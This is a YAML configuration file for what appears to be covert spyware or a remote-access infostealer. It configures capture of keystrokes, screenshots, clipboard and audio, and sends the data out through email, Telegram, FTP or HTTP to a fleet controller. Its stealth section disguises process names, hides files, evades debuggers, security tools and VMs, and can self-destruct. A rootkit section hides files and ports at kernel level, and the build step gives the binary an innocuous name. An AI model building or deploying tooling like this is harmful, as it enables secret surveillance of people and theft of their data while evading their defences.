general:
  report_interval: 30
  data_dir: "./data"
  log_level: "INFO"
  log_file: "./logs/app.log"
  auto_install_deps: false

capture:
  keyboard:
    enabled: false
    include_key_up: false
    max_buffer: 10000
    biometrics_enabled: false
  mouse:
    enabled: false
    track_movement: false
    move_throttle_interval: 0.1  # Seconds between move events when tracking
  screenshot:
    enabled: true
    quality: 80
    format: "png"
    capture_region: "full"
    max_count: 100
  clipboard:
    enabled: false
    poll_interval: 5
    max_length: 10000
  window:
    enabled: false
    poll_interval: 2
  audio:
    enabled: false
    duration: 10
    sample_rate: 44100
    channels: 1
    max_count: 50
    interval: 300

storage:
  backend: "local"
  max_size_mb: 500
  rotation: true
  sqlite_path: "./data/captures.db"
  purge_sent_after_seconds: 86400  # Delete sent records older than 24 hours

# ── Offline-First Sync Engine ────────────────────────────────────────
# Replaces the basic get_pending→send→mark_sent loop with a full sync
# pipeline: priority queuing, adaptive batching, checkpointing, retry
# with backoff, connectivity awareness, and conflict resolution.
sync:
  enabled: true
  mode: "immediate"              # immediate | interval | manual
  interval_seconds: 10           # for "interval" mode
  max_batch_size: 50
  min_batch_size: 5
  max_batch_mb: 10
  compression: true
  compression_threshold_bytes: 1024
  integrity_check: true
  max_retry_attempts: 5
  retry_backoff_base: 2.0        # exponential backoff base (seconds)
  retry_backoff_max: 300          # max backoff cap (5 minutes)
  priority_order:
    - "critical"
    - "normal"
    - "low"

  connectivity:
    check_interval: 30            # seconds between probes
    probe_timeout: 5              # TCP connect timeout
    backpressure_threshold_mb: 100  # urgency trigger when DB exceeds this
    policies:
      wifi:
        max_batch_mb: 10
        min_interval: 0
      cellular:
        max_batch_mb: 1
        min_interval: 300
      wired:
        max_batch_mb: 20
        min_interval: 0
      default:
        max_batch_mb: 5
        min_interval: 10

  checkpoint:
    enabled: true
    retention_hours: 24

  conflict:
    default_strategy: "last_writer_wins"  # last_writer_wins | server_wins | client_wins | merge_fields
    auto_resolve_captures: true
    queue_config_conflicts: true

# ── Session Recording & Visual Replay ────────────────────────────────
# Records user sessions as coordinated screenshot + input event streams.
# Event-driven: screenshots fire on clicks, window changes, and idle.
recording:
  enabled: false                    # set to true to enable session recording
  database_path: "./data/sessions.db"
  frames_dir: "./data/sessions/frames"
  idle_screenshot_seconds: 5        # take screenshot after N seconds keyboard idle
  max_frames_per_session: 500
  screenshot_quality: 70            # JPEG quality (1-100)
  max_session_duration: 3600        # auto-stop after 1 hour
  auto_start: true                  # start recording on launch
  retention_days: 7                 # auto-delete sessions older than this

transport:
  method: "email"
  retry_attempts: 3
  retry_backoff: 2
  batch_size: 50
  queue_size: 1000
  failure_threshold: 5
  cooldown: 60

  email:
    smtp_server: "smtp.gmail.com"
    smtp_port: 465
    use_ssl: true
    sender: ""
    password: ""
    recipient: ""

  http:
    url: ""
    method: "POST"
    headers: {}
    timeout: 30
    verify: true
    # Path to custom CA certificate bundle (for self-signed server certs).
    # Leave empty to use system CA store (works with Let's Encrypt).
    ca_cert: ""
    healthcheck_url: ""
    healthcheck_interval: 60

  ftp:
    host: ""
    port: 21
    username: ""
    password: ""
    remote_dir: "/uploads"
    use_tls: false

  telegram:
    bot_token: ""
    chat_id: ""

  websocket:
    url: ""
    reconnect_interval: 5
    heartbeat_interval: 30
    ssl: false
    verify_ssl: true

encryption:
  enabled: false
  mode: "symmetric"         # "symmetric" (AES-256-CBC) or "e2e"
  algorithm: "AES-256-CBC"
  key: ""
  # E2E mode: generate server keys with `python -m server.run --generate-keys`,
  # then set transport.method to "http" and transport.http.url to
  # "http://<server-host>:8000/ingest".
  e2e:
    curve: "curve25519"           # fixed — not configurable
    signing: "ed25519"            # fixed — not configurable
    bulk_cipher: "aes-256-gcm"    # fixed — not configurable
    key_rotation_hours: 24
    key_store_path: "~/.local/share/security-keys/"
    server_public_key: ""   # base64-encoded X25519 public key from server
    pin_server_key: true
    emit_client_keys: false
    client_keys_path: ""

compression:
  enabled: true
  format: "zip"

biometrics:
  enabled: false
  sample_size: 500
  profile_id_prefix: "usr"
  store_profiles: true
  authentication:
    enabled: false           # Enable user authentication via typing patterns
    match_threshold: 50.0    # Distance threshold for profile matching (lower = stricter)
    min_samples: 100         # Minimum keystrokes needed for reliable authentication

profiler:
  enabled: false
  idle_gap_seconds: 300
  focus_min_seconds: 600
  emit_interval_seconds: 300
  top_n: 10
  productive_categories:
    - "work"
  categories:
    work:
      - "Visual Studio Code"
      - "IntelliJ"
      - "Terminal"
      - "Xcode"
      - "Figma"
    communication:
      - "Slack"
      - "Discord"
      - "Microsoft Teams"
      - "Zoom"
      - "Mail"
    browser:
      - "Google Chrome"
      - "Firefox"
      - "Safari"
      - "Microsoft Edge"
    entertainment:
      - "Spotify"
      - "YouTube"
      - "Netflix"
    uncategorized:
      - "*"
  # store_profiles: true  # Unused — profiler.store_profiles is never read by code

pipeline:
  enabled: false
  middleware:
    - name: timestamp_enricher
      enabled: true
    - name: context_annotator
      enabled: true
    - name: deduplicator
      enabled: true
      config:
        window_seconds: 5
        types: ["clipboard", "window"]
    - name: content_truncator
      enabled: true
      config:
        default_max_length: 10000
    - name: rate_limiter
      enabled: true
      config:
        max_events_per_second: 50
    - name: conditional_router
      enabled: false
      config:
        routes:
          screenshot: "s3"
          keystroke: "sqlite"
    - name: metrics_emitter
      enabled: true
      config:
        log_interval_seconds: 60

rules:
  enabled: false
  path: "./config/rules.yaml"
  mode: "all"                 # "all" or "first"
  reload_interval_seconds: 2
  keystroke_buffer_max: 1024

service:
  name: "system-helper"
  description: "System Helper Service"
  config_path: "~/.config/system-helper/config.yaml"
  restart_sec: 10
  start_limit_burst: 3
  start_limit_interval: 60
  # display: ":0"  # Unused — not read by any service manager code

fleet:
  enabled: false
  database_path: "./data/fleet.db"

  # Agent configuration (used by fleet/run_agent.py and agent_controller.py)
  agent:
    # agent_id: ""                # Auto-generated UUID if not specified
    controller_url: ""            # URL of the fleet controller
    # hostname: ""                # Auto-detected from socket.gethostname()
    # platform: ""                # Auto-detected from sys.platform
    version: "1.0.0"
    heartbeat_interval: 60        # Seconds between heartbeats
    reconnect_interval: 30        # Seconds between reconnection attempts
    max_retries: 5                # Max reconnection attempts before giving up
    command_poll_interval: 5      # Seconds between command polls (HTTP mode)
    sign_requests: false          # Sign outgoing requests with agent private key (match require_signature_verification)
    transport_method: "http"      # Transport: "http" or "websocket"

  auth:
    jwt_secret: "CHANGE_ME_IN_PRODUCTION"  # 32+ char secret
    # Set to true explicitly for development/testing to allow the default JWT secret.
    # In production, this must remain false and a real secret must be configured.
    allow_default_secret: false
    access_token_ttl_minutes: 15
    refresh_token_ttl_days: 7
    # NOTE: max_failed_attempts and lockout_minutes are defined but not yet enforced
    max_failed_attempts: 5        # TODO: Implement login attempt tracking
    lockout_minutes: 30           # TODO: Implement account lockout

  controller:
    max_agents: 1000
    heartbeat_timeout: 120        # Seconds before agent marked offline
    max_command_history: 1000     # Max completed commands to retain
    cleanup_interval: 300         # Seconds between cleanup runs
    # NOTE: command_timeout_seconds and max_queue_depth are defined but not yet enforced
    heartbeat_timeout_seconds: 300  # TODO: Implement timeout monitoring
    command_timeout_seconds: 60     # TODO: Implement command timeout
    max_queue_depth: 1000           # TODO: Implement queue depth limiting

  transport:
    # NOTE: These toggles are defined but not yet enforced - all transports are available
    http_enabled: true            # TODO: Check before allowing HTTP transport
    websocket_enabled: true       # TODO: Check before allowing WebSocket transport
    redis_enabled: false          # TODO: Check before allowing Redis transport
    redis_url: "redis://localhost:6379"

  security:
    # NOTE: max_payload_size_mb and rate_limit are defined but not yet enforced
    max_payload_size_mb: 10       # TODO: Implement payload size validation
    rate_limit_requests_per_minute: 60  # TODO: Implement rate limiting
    # Signature verification: when enabled, agents must sign requests with their
    # private key and include the signature in the X-Signature header (base64).
    # The controller verifies using the agent's stored public key.
    # SECURITY NOTE: Set to true in production to prevent request forgery.
    # TLS provides transport encryption; signatures provide authentication/integrity.
    # Must match fleet.agent.sign_requests — both must be true or both false.
    require_signature_verification: false

# ── Stealth Mode ─────────────────────────────────────────────────────
# Minimise the application's observable footprint on the host system.
# Levels: off, low, medium, high, maximum (each includes the one below).
stealth:
  enabled: false
  level: "off"                      # off | low | medium | high | maximum

  process:
    masquerade_name: "auto"         # "auto" picks per-platform, or specify custom
    rotate_interval: 0              # seconds between name rotations (0 = disabled)
    sanitize_threads: true
    sanitize_argv: true

  filesystem:
    hidden_dirs: true
    timestamp_preservation: true
    minimal_footprint: false
    custom_paths:                    # empty = auto-generate innocuous per-platform paths
      pid_file: ""
      data_dir: ""
      log_dir: ""

  logging:
    silent_mode: false              # suppress all console output
    suppress_file_log: false        # disable file logging
    memory_ring_buffer: true        # keep last N entries in memory for remote debug
    ring_buffer_size: 500
    sanitize_messages: true         # scrub identifiable strings from log messages
    suppress_startup_banner: true   # skip system-info dump at startup

  resources:
    cpu_jitter_factor: 0.3          # Gaussian jitter sigma as fraction of interval
    cpu_ceiling: 15                 # max % CPU before throttling
    io_spread: true                 # spread I/O writes over time
    idle_sleep_interval: 30         # seconds to sleep when user is idle

  detection:
    enabled: true
    scan_interval_min: 10           # randomised scan interval bounds (seconds)
    scan_interval_max: 60
    monitor_response: "throttle"    # ignore | throttle | pause | hibernate | self_destruct
    debugger_response: "pause"
    security_tool_response: "pause"
    vm_detection: true
    vm_response: "ignore"

  network:
    timing_jitter: 0.4              # Gaussian jitter factor for send intervals
    packet_normalization: true      # pad/chunk payloads to HTTPS-typical sizes
    user_agent_rotation: true       # rotate User-Agent on HTTP transport
    send_window:
      enabled: false
      start_hour: 9                 # only send between these hours
      end_hour: 18
    max_bandwidth_bps: 0            # 0 = unlimited

# ── Rootkit Integration ───────────────────────────────────────────────
# Kernel-level hiding via native C modules (Linux LKM, macOS dylib, Windows minifilter).
# Requires root/admin privileges and platform-specific build tools.
# Gracefully degrades if unavailable — user-space stealth still works.
rootkit:
  enabled: false
  auto_compile: true                # compile native module from source if not prebuilt
  hide_prefixes:                    # file prefixes to hide from directory listings
    - ".com.apple.dt.instruments"
    - ".dbus-session"
    - "preferences.db"
    - "cache.db"
  hide_ports: []                    # TCP ports to hide from netstat/ss (list of integers)
  dylib_path: ""                    # custom path to macOS interpose.dylib (empty = auto-detect)

# ── Build Pipeline ────────────────────────────────────────────────────
# Nuitka compilation + string encryption + symbol stripping.
# Run: python -m build.pipeline --level hardened --output dist/
build:
  level: "standard"                 # standard | hardened | maximum
  output_dir: "dist"
  output_name: "system_service"     # innocuous binary name
  entry_point: "main.py"

self_destruct:
  secure_wipe: false
  remove_program: false
  remove_service: true
